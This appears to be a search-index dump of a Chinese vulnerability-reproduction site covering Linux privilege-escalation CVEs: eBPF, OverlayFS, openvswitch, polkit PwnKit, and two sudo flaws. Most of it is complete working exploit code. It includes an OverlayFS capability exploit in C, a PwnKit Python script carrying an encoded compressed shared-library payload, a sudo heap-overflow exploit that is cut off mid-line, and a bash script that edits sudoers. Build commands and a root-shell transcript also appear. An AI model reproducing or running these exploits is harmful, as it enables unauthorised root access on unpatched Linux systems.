所使用的内核。Linux 内核是一种开源的类Unix 操作系统宏内核。整个 Linux 操作系统家族基于该内核部署在传统计算机平台（如个人计算机和服务器）。该漏洞是由于 Linux 内核的 BPF 验证器存在一个空指针漏洞，没有对 *_OR_NULL 指针类型进行限制，允许这些类型进行指针运算。攻击者可利用该漏洞在获得低权限的情况下，构造恶意数据执行空指针引用攻击，最终获取服务器 root 权限 ","date":"0001-01-01","objectID":"/linux-ebpf%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-23222/:1:0","tags":null,"title":"","uri":"/linux-ebpf%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-23222/"},{"categories":null,"content":"漏洞影响 Linux 5.8 - 5.16（在5.10.92 / 5.15.15 / 5.16.1中修复） ","date":"0001-01-01","objectID":"/linux-ebpf%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-23222/:2:0","tags":null,"title":"","uri":"/linux-ebpf%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-23222/"},{"categories":null,"content":"漏洞复现 Exp：https://github.com/tr3ee/CVE-2022-23222 $ make cc -I include -static -w -o exploit exploit.c $ ./exploit [*] phase(1/8) 'create bpf map(s)' running [+] phase(1/8) 'create bpf map(s)' done [*] phase(2/8) 'do some leak' running [+] phase(2/8) 'do some leak' done [*] phase(3/8) 'prepare arbitrary rw' running [+] phase(3/8) 'prepare arbitrary rw' done [*] phase(4/8) 'spawn processes' running [+] phase(4/8) 'spawn processes' done [*] phase(5/8) 'find cred (slow)' running [+] phase(5/8) 'find cred (slow)' done [*] phase(6/8) 'overwrite cred' running [+] phase(6/8) 'overwrite cred' done [*] phase(7/8) 'spawn root shell' running [+] Enjoy root! # id uid=0(root) gid=0(root) groups=65534(nobody) # exit [+] phase(7/8) 'spawn root shell' done [*] phase(8/8) 'clean up the mess' running [+] phase(8/8) 'clean up the mess' done ","date":"0001-01-01","objectID":"/linux-ebpf%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-23222/:3:0","tags":null,"title":"","uri":"/linux-ebpf%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-23222/"},{"categories":null,"content":"Linux kernel权限提升漏洞 CVE-2021-3493 ","date":"0001-01-01","objectID":"/linux-kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3493/:0:0","tags":null,"title":"","uri":"/linux-kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3493/"},{"categories":null,"content":"漏洞描述 Ubuntu OverlayFS Local Privesc CVE-2021-3493 EXP在Github被公开，可以通过EXP在Ubuntu多个影响系统中提升 ROOT权限 ","date":"0001-01-01","objectID":"/linux-kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3493/:1:0","tags":null,"title":"","uri":"/linux-kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3493/"},{"categories":null,"content":"漏洞影响 Ubuntu 20.10 Ubuntu 20.04 LTS Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 ESM ","date":"0001-01-01","objectID":"/linux-kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3493/:2:0","tags":null,"title":"","uri":"/linux-kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3493/"},{"categories":null,"content":"漏洞复现 漏洞Github地址为：https://github.com/briskets/CVE-2021-3493 环境使用腾讯云的Ubuntu镜像即可 gcc exploit.c -o exploit chmod +x exploit ./exploit 下载并编译脚本 运行EXP成功提权 Root ","date":"0001-01-01","objectID":"/linux-kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3493/:3:0","tags":null,"title":"","uri":"/linux-kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3493/"},{"categories":null,"content":"漏洞POC #define _GNU_SOURCE #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003cunistd.h\u003e #include \u003cfcntl.h\u003e #include \u003cerr.h\u003e #include \u003cerrno.h\u003e #include \u003csched.h\u003e #include \u003csys/types.h\u003e #include \u003csys/stat.h\u003e #include \u003csys/wait.h\u003e #include \u003csys/mount.h\u003e //#include \u003cattr/xattr.h\u003e //#include \u003csys/xattr.h\u003e int setxattr(const char *path, const char *name, const void *value, size_t size, int flags); #define DIR_BASE \"./ovlcap\" #define DIR_WORK DIR_BASE \"/work\" #define DIR_LOWER DIR_BASE \"/lower\" #define DIR_UPPER DIR_BASE \"/upper\" #define DIR_MERGE DIR_BASE \"/merge\" #define BIN_MERGE DIR_MERGE \"/magic\" #define BIN_UPPER DIR_UPPER \"/magic\" static void xmkdir(const char *path, mode_t mode) { if (mkdir(path, mode) == -1 \u0026\u0026 errno != EEXIST) err(1, \"mkdir %s\", path); } static void xwritefile(const char *path, const char *data) { int fd = open(path, O_WRONLY); if (fd == -1) err(1, \"open %s\", path); ssize_t len = (ssize_t) strlen(data); if (write(fd, data, len) != len) err(1, \"write %s\", path); close(fd); } static void xcopyfile(const char *src, const char *dst, mode_t mode) { int fi, fo; if ((fi = open(src, O_RDONLY)) == -1) err(1, \"open %s\", src); if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1) err(1, \"open %s\", dst); char buf[4096]; ssize_t rd, wr; for (;;) { rd = read(fi, buf, sizeof(buf)); if (rd == 0) { break; } else if (rd == -1) { if (errno == EINTR) continue; err(1, \"read %s\", src); } char *p = buf; while (rd \u003e 0) { wr = write(fo, p, rd); if (wr == -1) { if (errno == EINTR) continue; err(1, \"write %s\", dst); } p += wr; rd -= wr; } } close(fi); close(fo); } static int exploit() { char buf[4096]; sprintf(buf, \"rm -rf '%s/'\", DIR_BASE); system(buf); xmkdir(DIR_BASE, 0777); xmkdir(DIR_WORK, 0777); xmkdir(DIR_LOWER, 0777); xmkdir(DIR_UPPER, 0777); xmkdir(DIR_MERGE, 0777); uid_t uid = getuid(); gid_t gid = getgid(); if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1) err(1, \"unshare\"); xwritefile(\"/proc/self/setgroups\", \"deny\"); sprintf(buf, \"0 %d 1\", uid); xwritefile(\"/proc/self/uid_map\", buf); sprintf(buf, \"0 %d 1\", gid); xwritefile(\"/proc/self/gid_map\", buf); sprintf(buf, \"lowerdir=%s,upperdir=%s,workdir=%s\", DIR_LOWER, DIR_UPPER, DIR_WORK); if (mount(\"overlay\", DIR_MERGE, \"overlay\", 0, buf) == -1) err(1, \"mount %s\", DIR_MERGE); // all+ep char cap[] = \"\\x01\\x00\\x00\\x02\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\"; xcopyfile(\"/proc/self/exe\", BIN_MERGE, 0777); if (setxattr(BIN_MERGE, \"security.capability\", cap, sizeof(cap) - 1, 0) == -1) err(1, \"setxattr %s\", BIN_MERGE); return 0; } int main(int argc, char *argv[]) { if (strstr(argv[0], \"magic\") || (argc \u003e 1 \u0026\u0026 !strcmp(argv[1], \"shell\"))) { setuid(0); setgid(0); execl(\"/bin/bash\", \"/bin/bash\", \"--norc\", \"--noprofile\", \"-i\", NULL); err(1, \"execl /bin/bash\"); } pid_t child = fork(); if (child == -1) err(1, \"fork\"); if (child == 0) { _exit(exploit()); } else { waitpid(child, NULL, 0); } execl(BIN_UPPER, BIN_UPPER, \"shell\", NULL); err(1, \"execl %s\", BIN_UPPER); } ","date":"0001-01-01","objectID":"/linux-kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3493/:4:0","tags":null,"title":"","uri":"/linux-kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3493/"},{"categories":null,"content":"Linux openvswitch权限提升漏洞 CVE-2022-2639 ","date":"0001-01-01","objectID":"/linux-openvswitch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-2639/:0:0","tags":null,"title":"","uri":"/linux-openvswitch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-2639/"},{"categories":null,"content":"漏洞描述 由于 openvswitch 模块在处理大量actions的情况下，可能存在越界写入漏洞，本地经过身份认证的攻击者可利用此漏洞获取root权限 ","date":"0001-01-01","objectID":"/linux-openvswitch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-2639/:1:0","tags":null,"title":"","uri":"/linux-openvswitch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-2639/"},{"categories":null,"content":"漏洞影响 3.13 ≤ Linux Kernel \u003c 5.18 ","date":"0001-01-01","objectID":"/linux-openvswitch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-2639/:2:0","tags":null,"title":"","uri":"/linux-openvswitch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-2639/"},{"categories":null,"content":"漏洞复现 编译POC并运行获取Root权限 ","date":"0001-01-01","objectID":"/linux-openvswitch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-2639/:3:0","tags":null,"title":"","uri":"/linux-openvswitch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-2639/"},{"categories":null,"content":"漏洞POC https://github.com/avboy1337/CVE-2022-2639-PipeVersion ","date":"0001-01-01","objectID":"/linux-openvswitch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-2639/:4:0","tags":null,"title":"","uri":"/linux-openvswitch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-2639/"},{"categories":null,"content":"Linux Polkit权限提升漏洞 CVE-2021-4034 ","date":"0001-01-01","objectID":"/linux-polkit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-4034/:0:0","tags":null,"title":"","uri":"/linux-polkit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-4034/"},{"categories":null,"content":"漏洞描述 Qualys 研究团队在 polkit 的 pkexec 中发现了一个内存损坏漏洞，该 SUID 根程序默认安装在每个主要的 Linux 发行版上。这个易于利用的漏洞允许任何非特权用户通过在其默认配置中利用此漏洞来获得易受攻击主机上的完全 root 权限。 ","date":"0001-01-01","objectID":"/linux-polkit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-4034/:1:0","tags":null,"title":"","uri":"/linux-polkit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-4034/"},{"categories":null,"content":"漏洞影响 Polkit \u003e 2009 ","date":"0001-01-01","objectID":"/linux-polkit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-4034/:2:0","tags":null,"title":"","uri":"/linux-polkit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-4034/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/linux-polkit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-4034/:3:0","tags":null,"title":"","uri":"/linux-polkit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-4034/"},{"categories":null,"content":"漏洞POC #!/usr/bin/env python3 # poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys # hardcoded amd64 lib from ctypes import * from ctypes.util import find_library import os import zlib import base64 import tempfile payload = zlib.decompress( base64.b64decode( \"\"\"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\"\"\" ) ) libc = CDLL(find_library(\"c\")) libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p) libc.execve.restype = c_ssize_t wd = tempfile.mkdtemp() open(wd + \"/pwn.so\", \"wb\").write(payload) os.mkdir(wd + \"/gconv/\") open(wd + \"/gconv/gconv-modules\", \"w\").write( \"module UTF-8// INTERNAL ../pwn 2\" ) os.mkdir(wd + \"/GCONV_PATH=.\") os.mknod(wd + \"/GCONV_PATH=./gconv\") os.chmod(wd + \"/GCONV_PATH=.\", 0o777) os.chmod(wd + \"/GCONV_PATH=./gconv\", 0o777) os.chmod(wd + \"/pwn.so\", 0o777) os.chdir(wd) cmd = b\"/usr/bin/pkexec\" argv = [] envp = [ b\"gconv\", b\"PATH=GCONV_PATH=.\", b\"LC_MESSAGES=en_US.UTF-8\", b\"XAUTHORITY=../gconv\", b\"\", ] cargv = (c_char_p * (len(argv) + 1))(*argv, None) cenv = (c_char_p * (len(envp) + 1))(*envp, None) libc.execve(cmd, cargv, cenv) ","date":"0001-01-01","objectID":"/linux-polkit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-4034/:4:0","tags":null,"title":"","uri":"/linux-polkit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-4034/"},{"categories":null,"content":"Linux sudo权限提升漏洞 CVE-2021-3156 ","date":"0001-01-01","objectID":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3156/:0:0","tags":null,"title":"","uri":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3156/"},{"categories":null,"content":"漏洞描述 2021年1月26日，Linux安全工具sudo被发现严重的基于堆缓冲区溢出漏洞。利用这一漏洞，攻击者无需知道用户密码，一样可以获得root权限，并且是在默认配置下。此漏洞已分配为CVE-2021-3156，危险等级评分为7分。 当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。 ","date":"0001-01-01","objectID":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3156/:1:0","tags":null,"title":"","uri":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3156/"},{"categories":null,"content":"漏洞影响 Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 ","date":"0001-01-01","objectID":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3156/:2:0","tags":null,"title":"","uri":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3156/"},{"categories":null,"content":"漏洞复现 目前POC已经在Github公开：Linux sudo权限提升漏洞 CVE-2021-3156 当前可以验证的Linux环境为 Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28 这里使用腾讯云中的Ubuntu镜像进行复现 使用命令 ","date":"0001-01-01","objectID":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3156/:3:0","tags":null,"title":"","uri":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3156/"},{"categories":null,"content":"漏洞利用POC 一个无交互式shell使用的脚本 https://github.com/Rvn0xsy/CVE-2021-3156-plus Makefile all: rm -rf libnss_X mkdir libnss_X gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c brute: all gcc -DBRUTE -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c clean: rm -rf libnss_X sudo-hax-me-a-sandwich hax.c /** ** CVE-2021-3156 PoC by blasty \u003cpeter@haxx.in\u003e ** =========================================== ** ** Exploit for that sudo heap overflow thing everyone is talking about. ** This one aims for singleshot. Does not fuck with your system files. ** No warranties. ** ** Shout outs to: ** Qualys - for pumping out the awesome bugs ** lockedbyte - for coop hax. (shared tmux gdb sessions ftw) ** dsc - for letting me rack up his electricity bill ** my wife - for all the quality time we had to skip ** ** Enjoy! ** ** -- blasty // 20210130 **/ #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cstdlib.h\u003e #include \u003cstdint.h\u003e #include \u003cunistd.h\u003e #include \u003cctype.h\u003e // 512 environment variables should be enough for everyone #define MAX_ENVP 512 #define SUDOEDIT_PATH \"/usr/bin/sudoedit\" typedef struct { char *target_name; char *sudoedit_path; uint32_t smash_len_a; uint32_t smash_len_b; uint32_t null_stomp_len; uint32_t lc_all_len; } target_t; target_t targets[] = { { // Yes, same values as 20.04.1, but also confirmed. .target_name = \"Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27\", .sudoedit_path = SUDOEDIT_PATH, .smash_len_a = 56, .smash_len_b = 54, .null_stomp_len = 63, .lc_all_len = 212 }, { .target_name = \"Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31\", .sudoedit_path = SUDOEDIT_PATH, .smash_len_a = 56, .smash_len_b = 54, .null_stomp_len = 63, .lc_all_len = 212 }, { .target_name = \"Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28\", .sudoedit_path = SUDOEDIT_PATH, .smash_len_a = 64, .smash_len_b = 49, .null_stomp_len = 60, .lc_all_len = 214 } }; void usage(char *prog) { fprintf(stdout, \" usage: %s \u003ctarget\u003e\\n\\n\" \" available targets:\\n\" \" ------------------------------------------------------------\\n\", prog ); for(int i = 0; i \u003c sizeof(targets) / sizeof(target_t); i++) { printf(\" %d) %s\\n\", i, targets[i].target_name); } fprintf(stdout, \" ------------------------------------------------------------\\n\" \"\\n\" \" manual mode:\\n\" \" %s \u003csmash_len_a\u003e \u003csmash_len_b\u003e \u003cnull_stomp_len\u003e \u003clc_all_len\u003e\\n\" \"\\n\", prog ); } int main(int argc, char *argv[]) { printf(\"\\n** CVE-2021-3156 PoC by blasty \u003cpeter@haxx.in\u003e\\n\\n\"); if (argc != 2 \u0026\u0026 argc != 5) { usage(argv[0]); return -1; } target_t *target = NULL; if (argc == 2) { int target_idx = atoi(argv[1]); if (target_idx \u003c 0 || target_idx \u003e= (sizeof(targets) / sizeof(target_t))) { fprintf(stderr, \"invalid target index\\n\"); return -1; } target = \u0026targets[ target_idx ]; } else { target = malloc(sizeof(target_t)); target-\u003etarget_name = \"Manual\"; target-\u003esudoedit_path = SUDOEDIT_PATH; target-\u003esmash_len_a = atoi(argv[1]); target-\u003esmash_len_b = atoi(argv[2]); target-\u003enull_stomp_len = atoi(argv[3]); target-\u003elc_all_len = atoi(argv[4]); } printf( \"using target: %s ['%s'] (%d, %d, %d, %d)\\n\", target-\u003etarget_name, target-\u003esudoedit_path, target-\u003esmash_len_a, target-\u003esmash_len_b, target-\u003enull_stomp_len, target-\u003elc_all_len ); char *smash_a = calloc(target-\u003esmash_len_a + 2, 1); char *smash_b = calloc(target-\u003esmash_len_b + 2, 1); memset(smash_a, 'A', target-\u003esmash_len_a); memset(smash_b, 'B', target-\u003esmash_len_b); smash_a[target-\u003esmash_len_a] = '\\\\'; smash_b[target-\u003esmash_len_b] = '\\\\'; char *s_argv[]={ \"sudoedit\", \"-s\", smash_a, \"\\\\\", smash_b, NULL }; char *s_envp[MAX_ENVP]; int envp_pos = 0; for(int i = 0; i \u003c target-\u003enull_stomp_len; i++) { s_envp[envp_pos++] = \"\\\\\"; } s_envp[envp_pos++] = \"X/P0P_SH3LLZ_\"; char *lc_all = calloc(target-\u003elc_all_len + 16, 1); strcpy(lc_all, \"LC_ALL=C.UTF-8@\"); memset(lc_all+15, 'C', target-\u003elc_all_len); s_envp[envp_pos++] = lc_all; s_envp[envp_pos++] = NULL; printf(\"** pray for your rootshell.. **\\n\"); execve(target-\u003esudoedit_path, s_argv, s_envp); re","date":"0001-01-01","objectID":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3156/:4:0","tags":null,"title":"","uri":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2021-3156/"},{"categories":null,"content":"Linux Sudo权限提升漏洞 CVE-2023-22809 ","date":"0001-01-01","objectID":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/:0:0","tags":null,"title":"","uri":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/"},{"categories":null,"content":"漏洞描述 Sudo 存在权限提升漏洞，攻击者可过特定的 payload 获取服务器 root 权限。 Sudo 中的 sudoedit 对处理用户提供的环境变量（如SUDO_EDITOR、VISUAL和EDITOR）中传递的额外参数存在缺陷。当用户指定的编辑器包含绕过 sudoers 策略的 \" –\" 参数时，拥有sudoedit 访问权限的本地攻击者可通过将任意条目附加到要处理的文件列表中，最终在目标系统上实现权限提升。该漏洞还影响部分 QNAP 操作系统：QTS、QuTS hero、QuTScloud、QVP（QVR Pro 设备）。 ","date":"0001-01-01","objectID":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/:1:0","tags":null,"title":"","uri":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/"},{"categories":null,"content":"漏洞影响 Sudo: 1.8.0~1.9.12p1 均受影响 QTS 与 QuTS hero： QTS \u003c 5.0.1.2346 build 20230322 QuTS \u003c hero h5.0.1.2348 build 20230324 ","date":"0001-01-01","objectID":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/:2:0","tags":null,"title":"","uri":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/"},{"categories":null,"content":"漏洞复现 exp.sh： #!/usr/bin/env bash # # Exploit Title: sudo 1.8.0 - 1.9.12p1 - Privilege Escalation # # Exploit Author: n3m1.sys # CVE: CVE-2023-22809 # Date: 2023/01/21 # Vendor Homepage: https://www.sudo.ws/ # Software Link: https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz # Version: 1.8.0 to 1.9.12p1 # Tested on: Ubuntu Server 22.04 - vim 8.2.4919 - sudo 1.9.9 # # Running this exploit on a vulnerable system allows a localiattacker to gain # a root shell on the machine. # # The exploit checks if the current user has privileges to run sudoedit or # sudo -e on a file as root. If so it will open the sudoers file for the # attacker to add a line to gain privileges on all the files and get a root # shell. if ! sudo --version | head -1 | grep -qE '(1\\.8.*|1\\.9\\.[0-9]1?(p[1-3])?|1\\.9\\.12p1)$' then echo \"\u003e Currently installed sudo version is not vulnerable\" exit 1 fi EXPLOITABLE=$(sudo -l | grep -E \"sudoedit|sudo -e\" | grep -E '\\(root\\)|\\(ALL\\)|\\(ALL : ALL\\)' | cut -d ')' -f 2-) if [ -z \"$EXPLOITABLE\" ]; then echo \"\u003e It doesn't seem that this user can run sudoedit as root\" read -p \"Do you want to proceed anyway? (y/N): \" confirm \u0026\u0026 [[ $confirm == [yY] ]] || exit 2 else echo \"\u003e BINGO! User exploitable\" fi echo \"\u003e Opening sudoers file, please add the following line to the file in order to do the privesc:\" echo \"$USER ALL=(ALL:ALL) ALL\" read -n 1 -s -r -p \"Press any key to continue...\" EDITOR=\"vim -- /etc/sudoers\" $EXPLOITABLE sudo su root exit 0 查看本地 sudo 版本： sudo -V 执行文件： ./exp.sh 